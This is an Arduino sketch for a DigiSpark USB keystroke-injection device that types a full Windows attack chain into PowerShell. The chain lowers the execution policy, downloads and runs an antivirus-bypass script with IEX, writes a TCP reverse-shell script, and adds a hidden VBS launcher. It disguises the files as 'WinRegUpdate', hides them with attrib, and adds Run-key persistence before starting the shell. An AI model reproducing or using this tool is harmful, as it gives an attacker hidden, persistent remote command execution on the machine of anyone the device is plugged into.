#include "DigiKeyboard.h"

void setup() {
  delay(400);
  DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
  delay(3000);

  // Win+R open run windows
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); 
  delay(1000);
  
  // Open a powershell
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
  delay(3000);

  // Modify ExecutionPolicy
  DigiKeyboard.print("Set-ExecutionPolicy -Scope CurrentUser Unrestricted");
  DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
  delay(300);
  DigiKeyboard.sendKeyStroke(KEY_Y,0);
  DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
  delay(600);

  // Bypass AV
  DigiKeyboard.print("IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/aloksaurabh/OffenPowerSh/master/Bypass/Invoke-AlokS-AvBypass.ps1'); Invoke-AlokS-AvBypass;");
  DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
  delay(2000);

  // Create dir
  DigiKeyboard.print("New-Item -Path \"$env:userprofile\" -Name \"WinRegUpdate\" -ItemType \"directory\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
  delay(800);
  
  // Create revshell file
  DigiKeyboard.print("Set-Content -Path \"$env:userprofile\\WinRegUpdate\\update.ps1\" -Value 'Start-Sleep -s 10; $client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',9999);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();'");
  DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
  delay(300);

  // Create vbs file to open a powershell, bypass AV and run the script silently
  DigiKeyboard.print("Set-Content -Path \"$env:userprofile\\WinRegUpdate\\regupdate.vbs\" -Value 'set shell = CreateObject(\"WScript.Shell\") : prof = shell.ExpandEnvironmentStrings( \"%USERPROFILE%\" ) : command = \"powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/aloksaurabh/OffenPowerSh/master/Bypass/Invoke-AlokS-AvBypass.ps1'); Invoke-AlokS-AvBypass; \"; powershell.exe -NoProfile -ExecutionPolicy Bypass -File \" & prof & \"\\WinRegUpdate\" & \"\\update.ps1\" :  shell.Run command,0'");
  DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
  delay(200);

  // Hide files and dir
  DigiKeyboard.print("attrib +s +h \"$env:userprofile\\WinRegUpdate\\*\"; attrib +s +h \"$env:userprofile\\WinRegUpdate\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
  delay(200);

  // Add persistence
  DigiKeyboard.print("reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v RegUpdate /t REG_SZ /d \"$env:userprofile\\WinRegUpdate\\regupdate.vbs\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
  delay(200);

  // Run the reverse shell for the first time
  DigiKeyboard.print("$env:userprofile\\WinRegUpdate\\regupdate.vbs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
  delay(200);

  // Close the powershell
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
 

}

void loop() {
  // put your main code here, to run repeatedly:
  digitalWrite(1, HIGH);
  delay(200);

  digitalWrite(1, LOW);
  delay(300);

}
